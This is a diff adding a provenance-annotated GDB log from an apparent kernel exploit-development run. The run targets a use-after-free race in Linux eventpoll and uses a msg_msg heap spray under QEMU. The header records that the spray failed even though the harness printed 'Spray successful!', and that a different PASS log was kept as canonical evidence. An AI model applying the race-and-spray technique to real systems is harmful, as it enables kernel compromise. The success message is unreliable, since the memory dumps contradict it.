@@ -1,0 +1,53 @@
+## PROVENANCE
+# Source: overwritten worktree state of EXP-018_raw_gdb.log as of 2026-08-05 (harness re-run clobbered the committed 08-01 PASS log).
+# This run shows NO 0x41414141 A-pattern after spray -> msg_msg did NOT reclaim the freed eventpoll.
+# NOTE: harness printed 'Spray successful!' unconditionally; the AFTER-spray dump contradicts it.
+# Negative reproduction consistent with NAT-005 (race not natively schedulable, DoS-only).
+# Committed PASS log restored as EXP-018_raw_gdb.log (canonical evidence for VER-026/EVO-008).
+#
+
+
+[*] Connected to QEMU
+Breakpoint 1 at 0xffff8000802bc9c0: file fs/eventpoll.c, line 346.[*] Breakpoints set. Continuing execution.
+[*] Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).
+[*] target_file=-0xfffffc74ed00, target_epoll=-0xfffffc74fac0
+[*] Original instruction at PC: -0x6effa000
+[*] Patched PC with infinite loop to suspend Thread A!
+Breakpoint 2 at 0xffff8000802bcbb4: file fs/eventpoll.c, line 793.
+[*] Thread B hit ep_free(-0xfffffc74fac0)!
+Breakpoint 3 at 0xffff8000802bcbbc: file fs/eventpoll.c, line 909.
+[*] Thread B finished ep_free. target_epoll is now FREED!
+[*] Memory dump of freed struct eventpoll (BEFORE spray):
+[*] 
+0xffff0000038b0540:	0x0000000000000000	0x0000000000000000
+0xffff0000038b0550:	0xffff0000038b0550	0xffff0000038b0550
+0xffff0000038b0560:	0x0000000000000000	0xffff0000038b0568
+0xffff0000038b0570:	0xffff0000038b0568	0x0000000000000000
+0xffff0000038b0580:	0xffff0000038b0580	0xffff0000038b0580
+0xffff0000038b0590:	0xffff0000038b0590	0xffff0000038b0590
+0xffff0000038b05a0:	0xffff0000038b0000	0x0000000000000000
+0xffff0000038b05b0:	0x0000000000000000	0xffffffffffffffff
+0xffff0000038b05c0:	0x0000000000000000	0xffff80008152be98
+0xffff0000038b05d0:	0xffff0000038b1300	0x0000000000000001
+0xffff0000038b05e0:	0xffff000001e6c3d0	0x0000000000000000
+0xffff0000038b05f0:	0x0000000000000000	0x0000000000000000
+
+[*] Timer fired! Interrupting GDB to check spray...
+[Switching to Thread 1.2]
+[*] Interrupted! Dumping memory (AFTER spray):
+[*] 
+0xffff0000038b0540:	0x0000000000000000	0x0000000000000000
+0xffff0000038b0550:	0xffff0000038b0550	0xffff0000038b0550
+0xffff0000038b0560:	0x0000000000000000	0xffff0000038b0568
+0xffff0000038b0570:	0xffff0000038b0568	0x0000000000000000
+0xffff0000038b0580:	0xffff0000038b0580	0xffff0000038b0580
+0xffff0000038b0590:	0xffff0000038b0590	0xffff0000038b0590
+0xffff0000038b05a0:	0xffff0000038b0000	0x0000000000000000
+0xffff0000038b05b0:	0x0000000000000000	0xffffffffffffffff
+0xffff0000038b05c0:	0x0000000000000000	0xffff80008152be98
+0xffff0000038b05d0:	0xffff0000038b1300	0x0000000000000001
+0xffff0000038b05e0:	0xffff000001e6c3d0	0x0000000000000000
+0xffff0000038b05f0:	0x0000000000000000	0x0000000000000000
+
+[*] Spray successful! Exiting GDB.
+[Inferior 1 (process 1) detached]
